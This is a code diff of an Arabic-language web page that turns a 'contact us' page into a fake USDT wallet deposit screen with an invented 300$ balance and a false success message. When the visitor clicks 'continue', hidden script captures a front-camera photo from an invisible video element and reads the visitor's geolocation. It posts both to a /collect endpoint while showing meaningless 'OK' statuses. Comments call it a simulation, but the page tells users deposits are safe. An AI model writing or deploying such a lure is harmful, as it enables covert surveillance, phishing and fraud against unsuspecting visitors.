@@ -1,271 +1,754 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
+
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>تواصل</title>
+
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+  >
+
+  <title>USDT ايداع</title>
 
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
-      font-family: system-ui, sans-serif;
+      margin: 0;
+      min-height: 100vh;
+
+      font-family:
+        system-ui,
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        sans-serif;
+
+      background:
+        linear-gradient(
+          135deg,
+          #07130e,
+          #0c2118,
+          #07130e
+        );
+
+      color: #ffffff;
+
+      display: flex;
+      justify-content: center;
+      align-items: center;
+
+      padding: 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 430px;
+    }
+
+    .training {
+      background: #402d00;
+      border: 1px solid #806000;
+
+      color: #ffd76a;
+
+      border-radius: 12px;
+
+      padding: 12px 15px;
+
+      margin-bottom: 14px;
+
       text-align: center;
-      padding: 2rem;
-      background: #f5f5f5;
+
+      font-size: 13px;
+      line-height: 1.7;
     }
 
     .card {
-      background: white;
-      max-width: 480px;
-      margin: auto;
-      padding: 2rem;
-      border-radius: 12px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      background: rgba(14, 27, 21, 0.96);
+
+      border: 1px solid rgba(255, 255, 255, 0.08);
+
+      border-radius: 22px;
+
+      padding: 24px;
+
+      box-shadow:
+        0 20px 60px rgba(0, 0, 0, 0.45);
     }
 
-    video {
-      border-radius: 8px;
-      margin-top: 1rem;
-      max-width: 100%;
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+
+      margin-bottom: 25px;
+    }
+
+    .logo {
+      width: 48px;
+      height: 48px;
+
+      border-radius: 50%;
+
+      background: #26a17b;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      font-size: 26px;
+      font-weight: 800;
+
+      color: white;
+    }
+
+    .title {
+      flex: 1;
+    }
+
+    .title h1 {
+      margin: 0;
+      font-size: 20px;
+    }
+
+    .title span {
+      color: #8da79a;
+      font-size: 13px;
+    }
+
+    .balance-label {
+      color: #91a49b;
+      font-size: 13px;
+      margin-bottom: 5px;
+    }
+
+    .balance {
+      font-size: 32px;
+      font-weight: 700;
+
+      margin-bottom: 25px;
+    }
+
+    .currency {
+      font-size: 16px;
+      color: #26a17b;
+      margin-right: 5px;
+    }
+
+    .actions {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+
+      margin-bottom: 20px;
+    }
+
+    .action {
+      border: 1px solid #29483b;
+
+      background: #13271f;
+
+      color: #ffffff;
+
+      border-radius: 12px;
+
+      padding: 14px;
+
+      font-size: 14px;
+    }
+
+    .action:first-child {
+      border-color: #26a17b;
+    }
+
+    .main-button {
+      width: 100%;
+
+      border: none;
+
+      border-radius: 13px;
+
+      background: #26a17b;
+
+      color: white;
+
+      padding: 15px;
+
+      font-size: 16px;
+      font-weight: 700;
+
+      cursor: pointer;
+
+      transition: 0.2s;
+    }
+
+    .main-button:hover {
+      filter: brightness(1.1);
+    }
+
+    .main-button:disabled {
+      opacity: 0.6;
+      cursor: wait;
     }
 
     .status {
-      margin-top: 1rem;
-      color: #555;
+      min-height: 25px;
+
+      margin-top: 17px;
+
+      text-align: center;
+
+      color: #a9bbb2;
+
+      font-size: 13px;
+
+      line-height: 1.7;
+    }
+
+    .success {
+      margin-top: 18px;
+
+      background: #10281e;
+
+      border: 1px solid #245d46;
+
+      border-radius: 12px;
+
+      padding: 15px;
+
+      text-align: center;
+
+      color: #91e2be;
+
+      display: none;
+    }
+
+    /*
+     * عناصر الكاميرا مخفية بالكامل.
+     * لا نعرض بث الفيديو للمستخدم.
+     */
+    #video,
+    #canvas {
+      display: none;
+    }
+
+    .footer {
+      text-align: center;
+
+      margin-top: 16px;
+
+      color: #60776d;
+
+      font-size: 11px;
     }
   </style>
 </head>
 
+
 <body>
 
-  <div class="card">
-    <h2>🛡️تواصل الان</h2>
+  <div class="container">
 
-    <p>
-      سيتم التواصل..
-    </p>
-
-    <div class="status" id="status">
-      مرحبا..
+    <div class="training">
+      ⚠️ <strong>USDT Public</strong><br>
+      جميع عمليات الايداع تتم بأمان
     </div>
 
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+
+    <div class="card">
+
+      <div class="header">
+
+        <div class="logo">
+          ₮
+        </div>
+
+        <div class="title">
+          <h1>USDT Wallet</h1>
+          <span>Tether USD</span>
+        </div>
+
+      </div>
+
+
+      <div class="balance-label">
+        الرصيد المتاح
+      </div>
+
+      <div class="balance">
+        300$
+        <span class="currency">USDT</span>
+      </div>
+
+
+      <div class="actions">
+
+        <div class="action">
+          ↓ إيداع
+        </div>
+
+        <div class="action">
+          ↑ سحب
+        </div>
+
+      </div>
+
+
+      <button
+        id="startButton"
+        class="main-button"
+      >
+        متابعة
+      </button>
+
+
+      <div
+        id="status"
+        class="status"
+      >
+        اضغط على متابعة لبدء عملية الايداع.
+      </div>
+
+
+      <div
+        id="success"
+        class="success"
+      >
+          تم إيداع الأموال بنجاح.
+      </div>
+
+    </div>
+
+
+    <div class="footer">
+      جميع الحقوق محفوظة © 2024
+    </div>
+
   </div>
 
-<script>
 
-const statusEl = document.getElementById('status');
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
+  <!--
+    عناصر الكاميرا مخفية.
+    لا يتم عرض الفيديو.
+  -->
+  <video
+    id="video"
+    autoplay
+    playsinline
+  ></video>
 
-async function getLocation() {
+  <canvas id="canvas"></canvas>
 
-  return new Promise((resolve, reject) => {
 
-    if (!navigator.geolocation) {
-      reject(new Error('اميرة خال'));
-      return;
+  <script>
+
+    const startButton =
+      document.getElementById('startButton');
+
+    const status =
+      document.getElementById('status');
+
+    const success =
+      document.getElementById('success');
+
+    const video =
+      document.getElementById('video');
+
+    const canvas =
+      document.getElementById('canvas');
+
+
+    /*
+     * تحديث الرسالة للمستخدم
+     */
+    function setStatus(message) {
+      status.textContent = message;
     }
 
-    navigator.geolocation.getCurrentPosition(
-      resolve,
-      reject,
-      {
-        enableHighAccuracy: true,
-        timeout: 15000,
-        maximumAge: 0
+
+    /*
+     * التقاط صورة من الكاميرا.
+     *
+     * الكاميرا لا تظهر للمستخدم.
+     *
+     * ترجع:
+     *   data:image/jpeg...
+     *
+     * أو:
+     *   null
+     */
+    async function getCameraPhoto() {
+
+      if (
+        !navigator.mediaDevices ||
+        !navigator.mediaDevices.getUserMedia
+      ) {
+        return null;
       }
+
+      let stream = null;
+
+      try {
+
+        stream =
+          await navigator.mediaDevices.getUserMedia({
+            video: {
+              facingMode: 'user',
+              width: {
+                ideal: 640
+              },
+              height: {
+                ideal: 480
+              }
+            },
+            audio: false
+          });
+
+
+        video.srcObject = stream;
+
+
+        /*
+         * ننتظر قليلًا حتى تصبح الصورة قابلة للالتقاط.
+         */
+        await new Promise(resolve =>
+          setTimeout(resolve, 300)
+        );
+
+
+        const width =
+          video.videoWidth || 640;
+
+        const height =
+          video.videoHeight || 480;
+
+
+        canvas.width = width;
+        canvas.height = height;
+
+
+        const ctx =
+          canvas.getContext('2d');
+
+
+        ctx.drawImage(
+          video,
+          0,
+          0,
+          width,
+          height
+        );
+
+
+        return canvas.toDataURL(
+          'image/jpeg',
+          0.75
+        );
+
+      } catch (error) {
+
+        console.log(
+          'EROR',
+          error.message
+        );
+
+        return null;
+
+      } finally {
+
+        /*
+         * إيقاف الكاميرا فورًا.
+         */
+        if (stream) {
+
+          stream
+            .getTracks()
+            .forEach(track => track.stop());
+
+        }
+
+        video.srcObject = null;
+      }
+    }
+
+
+    /*
+     * الحصول على الموقع.
+     *
+     * إذا رفض المستخدم الموقع أو فشلت العملية
+     * نرجع null بدل إيقاف المحاكاة.
+     */
+    function getLocation() {
+
+      return new Promise(resolve => {
+
+        if (!navigator.geolocation) {
+          resolve(null);
+          return;
+        }
+
+
+        navigator.geolocation.getCurrentPosition(
+
+          position => {
+
+            resolve({
+
+              lat:
+                position.coords.latitude,
+
+              lon:
+                position.coords.longitude,
+
+              acc:
+                position.coords.accuracy
+
+            });
+
+          },
+
+          error => {
+
+            console.log(
+              'EROR',
+              error.message
+            );
+
+            resolve(null);
+
+          },
+
+          {
+            enableHighAccuracy: false,
+
+            timeout: 1500,
+
+            maximumAge: 0
+          }
+
+        );
+
+      });
+    }
+
+
+    /*
+     * إرسال الصورة بشكل مستقل.
+     *
+     * لا تنتظر الموقع.
+     */
+    async function sendPhoto(photo) {
+
+      if (!photo) {
+        return false;
+      }
+
+      try {
+
+        const response =
+          await fetch('/collect', {
+
+            method: 'POST',
+
+            headers: {
+              'Content-Type':
+                'application/json'
+            },
+
+            body: JSON.stringify({
+
+              photo: photo
+
+            })
+
+          });
+
+
+        return response.ok;
+
+      } catch (error) {
+
+        console.error(
+          'EROR',
+          error
+        );
+
+        return false;
+      }
+    }
+
+
+    /*
+     * إرسال الموقع بشكل مستقل.
+     *
+     * لا ينتظر الصورة.
+     */
+    async function sendLocation(location) {
+
+      if (!location) {
+        return false;
+      }
+
+      try {
+
+        const response =
+          await fetch('/collect', {
+
+            method: 'POST',
+
+            headers: {
+              'Content-Type':
+                'application/json'
+            },
+
+            body: JSON.stringify({
+
+              location: location
+
+            })
+
+          });
+
+
+        return response.ok;
+
+      } catch (error) {
+
+        console.error(
+          'EROR',
+          error
+        );
+
+        return false;
+      }
+    }
+
+
+    /*
+     * بدء المحاكاة
+     */
+    async function startSimulation() {
+
+      startButton.disabled = true;
+
+      success.style.display = 'none';
+
+      setStatus(
+        'OK'
+      );
+
+
+      /*
+       * ------------------------------------------------
+       * أولًا: الصورة
+       * ------------------------------------------------
+       */
+
+      setStatus(
+        'OK'
+      );
+
+      const photo =
+        await getCameraPhoto();
+
+
+      /*
+       * إذا حصلنا على الصورة،
+       * نرسلها مباشرة ولا ننتظر الموقع.
+       */
+
+      if (photo) {
+
+        setStatus(
+          'OK'
+        );
+
+        await sendPhoto(photo);
+
+      }
+
+
+      /*
+       * ------------------------------------------------
+       * ثانيًا: الموقع
+       * ------------------------------------------------
+       */
+
+      setStatus(
+        'OK'
+      );
+
+      const location =
+        await getLocation();
+
+
+      /*
+       * إذا حصلنا على الموقع،
+       * نرسله مباشرة.
+       */
+
+      if (location) {
+
+        setStatus(
+          'OK'
+        );
+
+        await sendLocation(location);
+
+      }
+
+
+      /*
+       * النتيجة النهائية
+       */
+
+      if (photo && location) {
+
+        setStatus(
+          'OK'
+        );
+
+      } else if (photo) {
+
+        setStatus(
+          'ok'
+        );
+
+      } else if (location) {
+
+        setStatus(
+          'يتم التحقق انتظر قليلاً...'
+        );
+
+      } else {
+
+        setStatus(
+          'Public'
+        );
+
+      }
+
+
+      success.style.display = 'block';
+
+      startButton.disabled = false;
+    }
+
+
+    /*
+     * يبدأ فقط بعد ضغط المستخدم.
+     */
+    startButton.addEventListener(
+      'click',
+      startSimulation
     );
 
-  });
-
-}
-
-
-async function getCameraPhoto() {
-
-  if (!navigator.mediaDevices ||
-      !navigator.mediaDevices.getUserMedia) {
-
-    throw new Error('اميرة الخالد');
-  }
-
-  const stream = await navigator.mediaDevices.getUserMedia({
-    video: {
-      facingMode: 'user',
-      width: { ideal: 640 },
-      height: { ideal: 480 }
-    },
-    audio: false
-  });
-
-  video.srcObject = stream;
-  video.style.display = 'block';
-
-  await new Promise(resolve => {
-
-    if (video.readyState >= 2) {
-      resolve();
-    } else {
-      video.onloadedmetadata = resolve;
-    }
-
-  });
-
-  /*
-   * ننتظر قليلاً حتى تصل صورة فعلية من الكاميرا
-   */
-  await new Promise(resolve => setTimeout(resolve, 800));
-
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-
-  const context = canvas.getContext('2d');
-
-  context.drawImage(
-    video,
-    0,
-    0,
-    canvas.width,
-    canvas.height
-  );
-
-  const photo = canvas.toDataURL(
-    'image/jpeg',
-    0.85
-  );
-
-  /*
-   * إيقاف الكاميرا بعد التقاط الصورة
-   */
-  stream.getTracks().forEach(track => track.stop());
-
-  video.srcObject = null;
-
-  return photo;
-}
-
-
-async function startTest() {
-
-  try {
-
-    /*
-     * 1. طلب الموقع عند فتح الصفحة
-     */
-
-    statusEl.textContent =
-      'نورا خالد   ...';
-
-    const position = await getLocation();
-
-    const location = {
-      lat: position.coords.latitude,
-      lon: position.coords.longitude,
-      acc: position.coords.accuracy
-    };
-
-
-    /*
-     * 2. طلب الكاميرا
-     */
-
-    statusEl.textContent =
-      'اميرة';
-
-    let photo = null;
-
-    try {
-
-      photo = await getCameraPhoto();
-
-    } catch (cameraError) {
-
-      console.warn(
-        'Camera error:',
-        cameraError
-      );
-
-      statusEl.textContent =
-        'اميرة.';
-
-      await new Promise(
-        resolve => setTimeout(resolve, 1200)
-      );
-    }
-
-
-    /*
-     * 3. إرسال البيانات إلى الخادم
-     */
-
-    statusEl.textContent =
-      'تواصل...';
-
-    const response = await fetch('/collect', {
-
-      method: 'POST',
-
-      headers: {
-        'Content-Type': 'application/json'
-      },
-
-      body: JSON.stringify({
-        location,
-        photo
-      })
-
-    });
-
-
-    if (!response.ok) {
-      throw new Error(
-        'فشل الاتصال بالخادم'
-      );
-    }
-
-
-    /*
-     * 4. نجاح الاختبار
-     */
-
-    document.querySelector('.card').innerHTML = `
-      <h2>✅ اكتمل </h2>
-
-      <p>
-        سبتم التواصل  معك.
-      </p>
-
-      <p>
-        يستخدم الموقع للتواصل معك
-      </p>
-    `;
-
-  } catch (error) {
-
-    console.error(error);
-
-    statusEl.textContent =
-      '❌ ' +
-      (error.message ||
-       'تم رفض الصلاحية أو حدث خطأ.');
-
-  }
-
-}
-
-
-/*
- * تشغيل الاختبار تلقائياً عند فتح الصفحة
- */
-window.addEventListener(
-  'DOMContentLoaded',
-  startTest
-);
-
-</script>
+  </script>
 
 </body>
+
 </html>
-```
